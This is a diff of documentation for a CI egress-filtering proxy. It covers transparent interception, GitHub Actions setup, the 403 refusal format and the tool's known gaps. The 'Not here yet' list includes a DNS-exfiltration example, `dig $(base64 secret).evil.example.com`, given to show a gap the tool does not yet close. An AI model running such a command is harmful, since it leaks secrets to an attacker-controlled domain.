@@ -42,34 +42,55 @@ request inside it is checked properly.
 one compromised tarball does not — which needs the path, which needs TLS interception. A CA is
 generated in memory per run, written only where the build is told to trust it, and dies with the job.
 
-### What it does not do
+### Two strengths, and which one you are getting
 
-**It cannot filter what refuses to use it.** `HTTPS_PROXY` is a request. npm, pip, curl and git all
-honour it — but a malicious `postinstall` can simply not.
+**Proxy mode** — `exec`, `serve` — points the build at the guard with `HTTPS_PROXY` and friends. A
+variable is a **request**: npm, pip, curl and git all honour it, but a malicious `postinstall` that
+opens its own socket does not, and neither does any runtime with its own opinion. Node's built-in
+fetch ignores the proxy variables entirely unless `NODE_USE_ENV_PROXY` is set — which is how corepack
+was once observed downloading a package manager from a host that was refused one second later.
 
 That matters less than it sounds, because the proxy sits where packages are **fetched**: a blocked
-package is never downloaded, so its install script never runs. The gap is the second case only —
-code already executing that ignores the proxy. Closing it needs default-deny egress, which the
-container can enforce on itself:
+package is never downloaded, so its install script never runs. But it is filtering, not containment,
+and it should not be described to an auditor as containment.
 
-An entrypoint holding `CAP_NET_ADMIN` can put the job's own network namespace in default-deny and
-then **drop privileges before running the build**. The build inherits the namespace, so the rules
-apply to it, but not the capability, so it cannot remove them. Two things decide whether that holds:
+**Transparent mode** — `serve --transparent --redirect --install-ca` — ends the category. The kernel
+redirects outbound 80 and 443 to the guard before anything gets a say, the CA goes into the system
+trust store, and the destination is read from the traffic itself: the TLS `ClientHello`'s SNI, or the
+`Host` header on port 80. There is no variable to ignore and nothing to opt out of. A connection with
+no SNI cannot be identified and is refused — default deny covers "I cannot tell what this is" as well
+as "I know, and no".
 
-- **The capability must be granted from outside** — `--cap-add=NET_ADMIN`, or
-  `securityContext.capabilities`. Nothing inside an image grants it to itself. On GitHub Actions it
-  goes in `container.options`, which allows it — unlike `--network`, one of the two options Actions
-  forbids.
-- **The build must not keep it.** A build running as root with `CAP_NET_ADMIN` just flushes the rules
-  and walks out. The privilege drop *is* the control.
+```
+deter-guard serve --transparent --redirect --install-ca
+```
 
-`deter-guard` does not install those rules yet. Until it does, treat `exec` as strong filtering of
-cooperative tools — which is the whole acquisition half of a supply-chain attack — and not as a
-sandbox.
+Needs Linux and root: `--redirect` writes `iptables` rules and `--install-ca` writes the system trust
+store. GitHub-hosted runners provide passwordless sudo, and the action does this for you with
+`transparent: true`.
+
+Three things worth knowing before you turn it on:
+
+- **The guard exempts its own traffic**, by marking its sockets (`SO_MARK`) rather than by uid — on a
+  CI runner the guard and the build are the *same user*, so uid distinguishes them not at all. Without
+  the exemption the proxy's own upstream connection is redirected back into the proxy, forever.
+- **Your runner's control plane is permitted automatically.** Intercepting *everything* includes the
+  runner's own channel home, and a policy that forgot `github.com` would not merely fail the build —
+  it would stop the runner reporting that it had. The job would die mute. Those hosts are listed at
+  startup, and `--no-ci-hosts` enforces the policy against them too if you would rather have that.
+- **Anything on the machine trusts a CA we minted, for the length of the job.** The CA is generated
+  in memory per run, lasts 24 hours, exists on disk only in the file we install, and is removed on
+  the way out. That is a fair trade on an ephemeral runner and a bad one on a shared workstation.
+
+Node is the exception that still needs a variable: it ships its own roots and ignores the system
+trust store, so `NODE_EXTRA_CA_CERTS` is set even in transparent mode. `deter-guard env` covers it.
 
 ## Quick start
 
 ### GitHub Actions
+
+One step. Everything after it is guarded — no prefix on your commands, no environment to wire up,
+no teardown to remember:
 
 ```yaml
 jobs:
@@ -78,17 +99,45 @@ jobs:
     permissions:
       contents: read
       id-token: write # required — without it GitHub won't mint an OIDC token
-    container:
-      image: ghcr.io/incubits/deter-guard:1
+      packages: read
     steps:
-      - run: deter-guard policy --out egress.cedar
-        env:
-          DETER_CONSOLE_URL: https://console.example.com
-          DETER_POLICY_PUBKEY: ${{ vars.DETER_POLICY_PUBKEY }}
+      - uses: actions/checkout@v5
+      - uses: incubits/deter-guard@v1
+        with:
+          console: ${{ vars.DETER_CONSOLE_URL }}
+          pubkey: ${{ vars.DETER_POLICY_PUBKEY }}
+
+      - run: pnpm install --frozen-lockfile   # guarded
+      - run: pnpm build                       # guarded
 ```
+
+The action pulls the guard, verifies its build provenance, starts it, and puts it in front of every
+later step. At the end of the job — pass, fail or cancel — it stops the guard so the refusal report
+is flushed, prints the guard's log, and turns each refused host into an annotation on the run summary.
+
+That last part is why this is a step and not a snippet to copy. The report flushes on `SIGTERM`, so a
+guard the runner simply reaps enforces perfectly and reports **nothing**; you would keep the
+enforcement and silently lose the audit trail, and the build result would look identical either way.
 
 Claim your GitHub organization first, under **CI protection → Trusted CI owners**. Without that the
 exchange is refused — that's the point: a credential from an org you haven't claimed can't be used.
+
+<details>
+<summary>Doing it by hand instead</summary>
+
+```yaml
+      - run: |
+          deter-guard serve --detach --state-dir "$RUNNER_TEMP/deter"
+          deter-guard env --state-dir "$RUNNER_TEMP/deter" --format github >> "$GITHUB_ENV"
+        env:
+          DETER_CONSOLE_URL: ${{ vars.DETER_CONSOLE_URL }}
+          DETER_POLICY_PUBKEY: ${{ vars.DETER_POLICY_PUBKEY }}
+```
+
+If you do this, add a `if: always()` step that SIGTERMs the guard, or you lose the report. And set
+`NODE_USE_ENV_PROXY=1`, or corepack's own download of your package manager goes around the proxy.
+The action does both for you.
+</details>
 
 ### GitLab CI
 
@@ -96,7 +145,7 @@ GitLab requires the job to *declare* its ID token, so hand it over as `DETER_ID_
 
 ```yaml
 policy:
-  image: ghcr.io/incubits/deter-guard:1
+  image: ghcr.io/incubits/deter-guard:latest
   id_tokens:
     DETER_ID_TOKEN: { aud: "deter-console" }
   variables:
@@ -115,7 +164,7 @@ docker run --rm \
   -e DETER_CI_TOKEN="$DETER_CI_TOKEN" \
   -e DETER_POLICY_PUBKEY="$DETER_POLICY_PUBKEY" \
   -v "$PWD:/workspace" \
-  ghcr.io/incubits/deter-guard:1 \
+  ghcr.io/incubits/deter-guard:latest \
   policy --project "$JOB_NAME" --run "$BUILD_TAG" --out /workspace/egress.cedar
 ```
 
@@ -183,6 +232,39 @@ The proxy is configured for the build through the environment — `HTTPS_PROXY` 
 `SSL_CERT_FILE` and `CARGO_HTTP_CAINFO`. Missing one of those shows up as an inscrutable certificate
 error deep inside a package manager, so they are all set. `deter-guard env` prints exactly that list,
 which is why it exists: a list copied into your repository stops matching ours the next time it grows.
+
+## What a refusal looks like
+
+A refused request gets a real HTTP **403**, delivered inside the TLS session, with a body naming the
+host and the policy version:
+
+```json
+{
+  "error": "egress_refused",
+  "decision": "deny_policy",
+  "host": "registry.npmjs.org",
+  "reason": "host not permitted by the egress policy",
+  "policy_version": 1787493039,
+  "fix": "permit this host in the deter console, under your organization's egress policy"
+}
+```
+
+Nothing is sent to the refused host — the tunnel is terminated here and never dialled onward. The
+*status* is the point. Refusing the `CONNECT` instead looks like this to the client:
+
+```
+RequestAbortedError: Proxy response (403) !== 200 when HTTP Tunneling   (UND_ERR_ABORTED)
+```
+
+which is a **transport** error, and every package manager retries transport errors — that is what
+they are for. So a decision made in the first millisecond would be retried with backoff for minutes
+against a host that will never answer. None of them retry a 4xx. A real `pnpm install` against a
+refused registry now fails in **one second** with `ERR_PNPM_FETCH_403`, and you do not have to turn
+retries off in your own pipeline to get that.
+
+One quirk worth knowing: pnpm reacts to any 403 by printing your registry auth settings, so its
+output mentions authorization even though the refusal has nothing to do with credentials. The guard's
+own `DENY` line appears directly above it and says what actually happened.
 
 ## Adding the guard to an image you already build
 
@@ -281,6 +363,12 @@ Shape 3 is the one that holds against a process actively trying to get out, and 
 container genuinely has no other route. Do not describe shapes 1 and 2 to your auditors as
 containment.
 
+**Shape 4, and usually the right answer now: add `--transparent --redirect --install-ca`.** It gets
+shape 3's property — nothing can opt out — inside a single container, because the kernel redirects
+the traffic before any process is consulted. It needs Linux and root, which shapes 1 and 2 do not,
+so it is opt-in rather than the default. See
+[Two strengths](#two-strengths-and-which-one-you-are-getting).
+
 ## Exit codes
 
 Distinct on purpose — a pipeline shouldn't have to grep stderr to know what happened.
@@ -340,12 +428,14 @@ Pin `sha-<commit>` in a pipeline if you want an immutable tag.
 
 ## Not here yet
 
-- **Transparent interception.** `exec` and `serve` filter what is *sent* through the proxy; neither
-  stops a process from ignoring `HTTPS_PROXY` and opening its own socket. The sidecar shape above
-  closes that off at the network layer today, but it takes a second container and a shared network
-  namespace. Doing it inside one container means redirecting outbound 80/443 with nftables and
-  reading the SNI off a raw `ClientHello` — the proxy is CONNECT-only right now, so this is real work
-  rather than a flag. See [What it does not do](#what-it-does-not-do).
+- **DNS policy.** Transparent mode redirects TCP 80 and 443, so a build cannot reach a refused host
+  over HTTP — but it can still resolve names, and a resolver is a channel. Nothing stops
+  `dig $(base64 secret).evil.example.com` today.
+- **Ports other than 80 and 443.** A registry on :8443, `git+ssh`, or anything speaking its own
+  protocol goes straight past the redirect. The rules are two lines; knowing what to do with the
+  traffic once it arrives is not.
+- **Certificate pinning.** Anything that pins a certificate breaks under interception by design, and
+  there is no way to filter it and no allowlist for tunnelling it through uninspected yet.
 - **A blocklist feed.** The client already understands and enforces `blocked` entries, and the
   console already serves the field — but nothing populates it yet. Once a feed lands, every job
   picks it up on its next run with no change here.
